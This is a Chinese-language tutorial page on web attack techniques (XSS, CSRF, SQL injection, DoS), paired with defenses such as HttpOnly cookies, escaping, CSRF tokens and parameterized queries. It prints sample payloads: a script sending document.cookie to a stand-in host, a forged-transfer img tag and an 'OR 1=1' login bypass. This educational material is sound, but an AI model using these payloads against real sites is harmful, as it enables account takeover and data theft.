<!DOCTYPE html>
<html lang="zh" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="攻击技术 # 一、跨站脚本攻击 # 概念 # 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。
攻击原理 # 例如有一个论坛网站，攻击者可以在上面发布以下内容：
&lt;script&gt;location.href = &#34;//domain.com/?c=&#34; &#43; document.cookie&lt;/script&gt; 之后该内容可能会被渲染成以下形式：
&lt;p&gt; &lt;script&gt;location.href = &#34;//domain.com/?c=&#34; &#43; document.cookie&lt;/script&gt; &lt;/p&gt; 另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。
危害 # 窃取用户的 Cookie 伪造虚假的输入表单骗取个人信息 显示伪造的文章或者图片 防范手段 # 1. 设置 Cookie 为 HttpOnly # 设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。
2. 过滤特殊字符 # 例如将 &lt; 转义为 &amp;lt;，将 &gt; 转义为 &amp;gt;，从而避免 HTML 和 Jascript 代码的运行。">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://example.com/keeplearning/docs/system-design/attack/">
  <meta property="og:site_name" content="KeepLearning">
  <meta property="og:title" content="攻击技术">
  <meta property="og:description" content="攻击技术 # 一、跨站脚本攻击 # 概念 # 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。
攻击原理 # 例如有一个论坛网站，攻击者可以在上面发布以下内容：
&lt;script&gt;location.href = &#34;//domain.com/?c=&#34; &#43; document.cookie&lt;/script&gt; 之后该内容可能会被渲染成以下形式：
&lt;p&gt; &lt;script&gt;location.href = &#34;//domain.com/?c=&#34; &#43; document.cookie&lt;/script&gt; &lt;/p&gt; 另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。
危害 # 窃取用户的 Cookie 伪造虚假的输入表单骗取个人信息 显示伪造的文章或者图片 防范手段 # 1. 设置 Cookie 为 HttpOnly # 设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。
2. 过滤特殊字符 # 例如将 &lt; 转义为 &amp;lt;，将 &gt; 转义为 &amp;gt;，从而避免 HTML 和 Jascript 代码的运行。">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">
    <meta property="article:modified_time" content="2022-12-26T11:35:58+08:00">
<title>攻击技术 | KeepLearning</title>
<link rel="manifest" href="/keeplearning/manifest.json">
<link rel="icon" href="/keeplearning/favicon.png" >
<link rel="canonical" href="https://example.com/keeplearning/docs/system-design/attack/">
<link rel="stylesheet" href="/keeplearning/book.min.c800dd82e49099945db6750ce1011947221e4464ea7e2ba833b653fe2dd19d1c.css" integrity="sha256-yADdguSQmZRdtnUM4QEZRyIeRGTqfiuoM7ZT/i3RnRw=" crossorigin="anonymous">
  <script defer src="/keeplearning/fuse.min.js"></script>
  <script defer src="/keeplearning/zh.search.min.6fccc1aefa97c7da4c75b2a1a67c661da4610910143e9a1de17a8e189f84520a.js" integrity="sha256-b8zBrvqXx9pMdbKhpnxmHaRhCRAUPpod4XqOGJ&#43;EUgo=" crossorigin="anonymous"></script>

  <script defer src="/keeplearning/sw.min.559fc49347ec89de6e20d5e68d8bdab142322ec9991d085fb954646f16b7984f.js" integrity="sha256-VZ/Ek0fsid5uINXmjYvasUIyLsmZHQhfuVRkbxa3mE8=" crossorigin="anonymous"></script>

  

<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/keeplearning/"><span>KeepLearning</span>
  </a>
</h2>


<div class="book-search hidden">
  <input type="text" id="book-search-input" placeholder="搜索" aria-label="搜索" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>




<ul>
    <li>
        <a href="javascript:void(0)" onclick="hrefIndex()" rel="noopener">主页</a>
    </li>
    <li>
        <a href="https://github.com/xiaobinqt" target="_blank" rel="noopener">GitHub</a>
    </li>
</ul>

<hr>

<script>
    function hrefIndex() {
        window.location = window.location.origin;
    }
</script>


  
<ul>
  
  <li>
    <a href=""  target="_blank" rel="noopener">
        
      </a>
  </li>
  
</ul>







  



  
  <ul>
    
      
        <li class="book-section-flat" >
          
  
  

  
    <span>MySQL</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/mysql/overview/" class="">总览</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/mysql/sql-grammar/" class="">SQL 语法</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/mysql/dbs-theory/" class="">数据库系统原理</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/mysql/faq1.md/" class="">常见问题（一）</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <span>Redis</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/redis/overview/" class="">总览</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/redis/string/" class="">STRING</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <span>系统设计</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/system-design/overview/" class="">系统设计基础</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/system-design/distributed/" class="">分布式</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/system-design/cluster/" class="">集群</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/system-design/attack/" class="active">攻击技术</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/system-design/cache/" class="">缓存</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/system-design/queue-message/" class="">消息队列</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <span>编码实践</span>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/coding-practice/regex/" class="">正则表达式</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/coding-practice/docker/" class="">Docker</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/coding-practice/git/" class="">Git</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/coding-practice/code-readability/" class="">代码可读性</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <a href="/keeplearning/docs/favorite/" class="">收藏夹</a>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/keeplearning/docs/favorite/cs-learn/" class="">计算机基础书籍推荐</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>















</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/keeplearning/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>攻击技术</strong>

  <label for="toc-control">
    
    <img src="/keeplearning/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#攻击技术">攻击技术</a>
      <ul>
        <li><a href="#一跨站脚本攻击">一、跨站脚本攻击</a>
          <ul>
            <li><a href="#概念">概念</a></li>
            <li><a href="#攻击原理">攻击原理</a></li>
            <li><a href="#危害">危害</a></li>
            <li><a href="#防范手段">防范手段</a></li>
          </ul>
        </li>
        <li><a href="#二跨站请求伪造">二、跨站请求伪造</a>
          <ul>
            <li><a href="#概念-1">概念</a></li>
            <li><a href="#攻击原理-1">攻击原理</a></li>
            <li><a href="#防范手段-1">防范手段</a></li>
          </ul>
        </li>
        <li><a href="#三sql-注入攻击">三、SQL 注入攻击</a>
          <ul>
            <li><a href="#概念-2">概念</a></li>
            <li><a href="#攻击原理-2">攻击原理</a></li>
            <li><a href="#防范手段-2">防范手段</a></li>
          </ul>
        </li>
        <li><a href="#四拒绝服务攻击">四、拒绝服务攻击</a></li>
        <li><a href="#参考资料">参考资料</a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown book-article"><h1 id="攻击技术">
  攻击技术
  <a class="anchor" href="#%e6%94%bb%e5%87%bb%e6%8a%80%e6%9c%af">#</a>
</h1>
<h2 id="一跨站脚本攻击">
  一、跨站脚本攻击
  <a class="anchor" href="#%e4%b8%80%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%ac%e6%94%bb%e5%87%bb">#</a>
</h2>
<h3 id="概念">
  概念
  <a class="anchor" href="#%e6%a6%82%e5%bf%b5">#</a>
</h3>
<p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p>
<h3 id="攻击原理">
  攻击原理
  <a class="anchor" href="#%e6%94%bb%e5%87%bb%e5%8e%9f%e7%90%86">#</a>
</h3>
<p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;//domain.com/?c=&#34;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>之后该内容可能会被渲染成以下形式：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;//domain.com/?c=&#34;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">p</span>&gt;
</span></span></code></pre></div><p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p>
<h3 id="危害">
  危害
  <a class="anchor" href="#%e5%8d%b1%e5%ae%b3">#</a>
</h3>
<ul>
<li>窃取用户的 Cookie</li>
<li>伪造虚假的输入表单骗取个人信息</li>
<li>显示伪造的文章或者图片</li>
</ul>
<h3 id="防范手段">
  防范手段
  <a class="anchor" href="#%e9%98%b2%e8%8c%83%e6%89%8b%e6%ae%b5">#</a>
</h3>
<h4 id="1-设置-cookie-为-httponly">
  1. 设置 Cookie 为 HttpOnly
  <a class="anchor" href="#1-%e8%ae%be%e7%bd%ae-cookie-%e4%b8%ba-httponly">#</a>
</h4>
<p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p>
<h4 id="2-过滤特殊字符">
  2. 过滤特殊字符
  <a class="anchor" href="#2-%e8%bf%87%e6%bb%a4%e7%89%b9%e6%ae%8a%e5%ad%97%e7%ac%a6">#</a>
</h4>
<p>例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p>
<p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p>
<p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p>
<p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;title&#34;</span>&gt;XSS Demo&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;123&lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;q&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">pre</span>&gt;hello&lt;/<span style="color:#f92672">pre</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">/xss/</span>);
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span>&gt;XSS Demo&lt;/<span style="color:#f92672">h1</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;123&lt;/<span style="color:#f92672">p</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&amp;lt;form&amp;gt;
</span></span><span style="display:flex;"><span>&amp;lt;input type=&#34;text&#34; name=&#34;q&#34; value=&#34;test&#34;&amp;gt;
</span></span><span style="display:flex;"><span>&amp;lt;/form&amp;gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">pre</span>&gt;hello&lt;/<span style="color:#f92672">pre</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&amp;lt;script type=&#34;text/javascript&#34;&amp;gt;
</span></span><span style="display:flex;"><span>alert(/xss/);
</span></span><span style="display:flex;"><span>&amp;lt;/script&amp;gt;
</span></span></code></pre></div><blockquote>
<p>
  <a href="http://jsxss.com/zh/try.html">XSS 过滤在线测试</a></p>
</blockquote>
<h2 id="二跨站请求伪造">
  二、跨站请求伪造
  <a class="anchor" href="#%e4%ba%8c%e8%b7%a8%e7%ab%99%e8%af%b7%e6%b1%82%e4%bc%aa%e9%80%a0">#</a>
</h2>
<h3 id="概念-1">
  概念
  <a class="anchor" href="#%e6%a6%82%e5%bf%b5-1">#</a>
</h3>
<p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p>
<p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p>
<h3 id="攻击原理-1">
  攻击原理
  <a class="anchor" href="#%e6%94%bb%e5%87%bb%e5%8e%9f%e7%90%86-1">#</a>
</h3>
<p>假如一家银行用以执行转账操作的 URL 地址如下：</p>
<pre tabindex="0"><code>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。
</code></pre><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p>
<pre tabindex="0"><code>&lt;img src=&#34;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&#34;&gt;。
</code></pre><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p>
<p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p>
<p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p>
<h3 id="防范手段-1">
  防范手段
  <a class="anchor" href="#%e9%98%b2%e8%8c%83%e6%89%8b%e6%ae%b5-1">#</a>
</h3>
<h4 id="1-检查-referer-首部字段">
  1. 检查 Referer 首部字段
  <a class="anchor" href="#1-%e6%a3%80%e6%9f%a5-referer-%e9%a6%96%e9%83%a8%e5%ad%97%e6%ae%b5">#</a>
</h4>
<p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p>
<p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p>
<h4 id="2-添加校验-token">
  2. 添加校验 Token
  <a class="anchor" href="#2-%e6%b7%bb%e5%8a%a0%e6%a0%a1%e9%aa%8c-token">#</a>
</h4>
<p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p>
<h4 id="3-输入验证码">
  3. 输入验证码
  <a class="anchor" href="#3-%e8%be%93%e5%85%a5%e9%aa%8c%e8%af%81%e7%a0%81">#</a>
</h4>
<p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p>
<h2 id="三sql-注入攻击">
  三、SQL 注入攻击
  <a class="anchor" href="#%e4%b8%89sql-%e6%b3%a8%e5%85%a5%e6%94%bb%e5%87%bb">#</a>
</h2>
<h3 id="概念-2">
  概念
  <a class="anchor" href="#%e6%a6%82%e5%bf%b5-2">#</a>
</h3>
<p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p>
<h3 id="攻击原理-2">
  攻击原理
  <a class="anchor" href="#%e6%94%bb%e5%87%bb%e5%8e%9f%e7%90%86-2">#</a>
</h3>
<p>例如一个网站登录验证的 SQL 查询代码为：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>strSQL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM users WHERE (name = &#39;&#34;</span> <span style="color:#f92672">+</span> userName <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;) and (pw = &#39;&#34;</span><span style="color:#f92672">+</span> passWord <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;&#39;);&#34;</span>
</span></span></code></pre></div><p>如果填入以下内容：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>userName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#39; OR &#39;1&#39;=&#39;1&#34;</span>;
</span></span><span style="display:flex;"><span>passWord <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#39; OR &#39;1&#39;=&#39;1&#34;</span>;
</span></span></code></pre></div><p>那么 SQL 查询字符串为：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>strSQL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM users WHERE (name = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;) and (pw = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;);&#34;</span>
</span></span></code></pre></div><p>此时无需验证通过就能执行以下查询：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>strSQL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM users;&#34;</span>
</span></span></code></pre></div><h3 id="防范手段-2">
  防范手段
  <a class="anchor" href="#%e9%98%b2%e8%8c%83%e6%89%8b%e6%ae%b5-2">#</a>
</h3>
<h4 id="1-使用参数化查询">
  1. 使用参数化查询
  <a class="anchor" href="#1-%e4%bd%bf%e7%94%a8%e5%8f%82%e6%95%b0%e5%8c%96%e6%9f%a5%e8%af%a2">#</a>
</h4>
<p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>PreparedStatement stmt <span style="color:#f92672">=</span> connection.<span style="color:#a6e22e">prepareStatement</span>(<span style="color:#e6db74">&#34;SELECT * FROM users WHERE userid=? AND password=?&#34;</span>);
</span></span><span style="display:flex;"><span>stmt.<span style="color:#a6e22e">setString</span>(1, userid);
</span></span><span style="display:flex;"><span>stmt.<span style="color:#a6e22e">setString</span>(2, password);
</span></span><span style="display:flex;"><span>ResultSet rs <span style="color:#f92672">=</span> stmt.<span style="color:#a6e22e">executeQuery</span>();
</span></span></code></pre></div><h4 id="2-单引号转换">
  2. 单引号转换
  <a class="anchor" href="#2-%e5%8d%95%e5%bc%95%e5%8f%b7%e8%bd%ac%e6%8d%a2">#</a>
</h4>
<p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p>
<h2 id="四拒绝服务攻击">
  四、拒绝服务攻击
  <a class="anchor" href="#%e5%9b%9b%e6%8b%92%e7%bb%9d%e6%9c%8d%e5%8a%a1%e6%94%bb%e5%87%bb">#</a>
</h2>
<p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p>
<p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>
<h2 id="参考资料">
  参考资料
  <a class="anchor" href="#%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99">#</a>
</h2>
<ul>
<li>
  <a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">维基百科：跨站脚本</a></li>
<li>
  <a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A">维基百科：SQL 注入攻击</a></li>
<li>
  <a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">维基百科：跨站点请求伪造</a></li>
<li>
  <a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A">维基百科：拒绝服务攻击</a></li>
</ul>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">


  <div><a class="flex align-center" href="https://github.com/xiaobinqt/xiaobinqt.github.io/commit/9caaeca2cfea2b23cc8f97741c37ea0009f1a382" title='最后修改者 weibin | 十二月 26, 2022' target="_blank" rel="noopener">
      <img src="/keeplearning/svg/calendar.svg" class="book-icon" alt="" />
      <span>十二月 26, 2022</span>
    </a>
  </div>



  <div>
    <a class="flex align-center" href="https://github.com/xiaobinqt/xiaobinqt.github.io/tree/main/content/docs/system-design/attack.md" target="_blank" rel="noopener">
      <img src="/keeplearning/svg/edit.svg" class="book-icon" alt="" />
      <span>编辑本页</span>
    </a>
  </div>


</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
  <div class="book-comments">

</div>
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#攻击技术">攻击技术</a>
      <ul>
        <li><a href="#一跨站脚本攻击">一、跨站脚本攻击</a>
          <ul>
            <li><a href="#概念">概念</a></li>
            <li><a href="#攻击原理">攻击原理</a></li>
            <li><a href="#危害">危害</a></li>
            <li><a href="#防范手段">防范手段</a></li>
          </ul>
        </li>
        <li><a href="#二跨站请求伪造">二、跨站请求伪造</a>
          <ul>
            <li><a href="#概念-1">概念</a></li>
            <li><a href="#攻击原理-1">攻击原理</a></li>
            <li><a href="#防范手段-1">防范手段</a></li>
          </ul>
        </li>
        <li><a href="#三sql-注入攻击">三、SQL 注入攻击</a>
          <ul>
            <li><a href="#概念-2">概念</a></li>
            <li><a href="#攻击原理-2">攻击原理</a></li>
            <li><a href="#防范手段-2">防范手段</a></li>
          </ul>
        </li>
        <li><a href="#四拒绝服务攻击">四、拒绝服务攻击</a></li>
        <li><a href="#参考资料">参考资料</a></li>
      </ul>
    </li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












